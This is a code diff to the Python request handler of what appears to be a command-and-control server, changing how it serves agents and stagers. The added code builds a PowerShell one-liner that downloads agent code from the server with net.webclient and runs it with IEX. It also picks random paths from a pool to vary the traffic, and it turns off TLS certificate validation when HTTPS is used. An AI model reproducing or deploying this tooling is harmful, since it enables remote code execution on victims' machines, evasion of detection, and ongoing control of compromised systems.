@@ -16,11 +16,12 @@ class AgentHandler(BaseHandler):
         # Get agent configuration from server if available
         agent_config = getattr(self.server, 'agent_config', None)
         
-        # Generate the agent code with modular path approach
+        # Generate the agent code with path pool only approach
         agent_code = generate_agent_code(
             server_address=server_address, 
-            beacon_path=current_paths["beacon_path"],
-            cmd_result_path=current_paths["cmd_result_path"],
+            # No need for dedicated paths anymore
+            beacon_path=None,
+            cmd_result_path=None,
             rotation_info=rotation_info,
             agent_config=agent_config
         )
@@ -35,16 +36,37 @@ class AgentHandler(BaseHandler):
         
     def handle_stager_request(self):
         """Send Base64 encoded stager to client"""
-        # Get the current agent path and server address
-        current_paths = self.path_router.get_current_paths()
-        agent_path = current_paths["agent_path"]
-        server_address = self.server.server_address
+        # Get server address components
+        server_ip = self.server.server_address[0]
+        server_port = self.server.server_address[1]
+        server_address = f"{server_ip}:{server_port}"
+        
+        # Check if SSL is enabled
+        use_ssl = hasattr(self.server, 'ssl_context') and self.server.ssl_context is not None
+        
+        # Get a random path from the pool for agent download
+        random_path = self.path_router.get_random_path()
+        
+        # Add agent type parameter to help with routing
+        if '?' in random_path:
+            random_path += '&type=agent'
+        else:
+            random_path += '?type=agent'
         
         # Create the stager code
-        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{server_address[0]}:{server_address[1]}{agent_path}');IEX($S)"
+        protocol = "https" if use_ssl else "http"
+        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('{protocol}://{server_address}{random_path}');IEX($S)"
         
-        # Log the stager request
-        self.log_message(f"Serving stager code to {self.client_address[0]}")
+        # Add SSL certificate validation bypass if using SSL
+        if use_ssl:
+            stager_code = (
+                "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\n"
+                "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n"
+                f"{stager_code}"
+            )
+        
+        # Log the stager request and path
+        self.log_message(f"Serving stager code to {self.client_address[0]} using path: {random_path}")
         
         # Send response with additional headers
         headers = {
